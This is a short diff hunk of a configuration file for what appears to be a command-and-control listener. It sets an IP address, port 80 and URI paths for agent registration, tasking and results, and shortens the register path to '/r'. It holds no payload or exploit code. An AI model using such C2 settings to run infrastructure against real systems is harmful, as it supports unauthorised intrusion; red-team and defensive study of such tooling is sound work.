@@ -20,7 +20,7 @@ ip = "57.129.0.118"
 # Configure listener port, mandatory even if hostname is specified
 port = 80
 # Configure the URI paths used for C2 communications
-registerPath = "/register"
+registerPath = "/r"
 taskPath = "/task"
 resultPath = "/result"
 
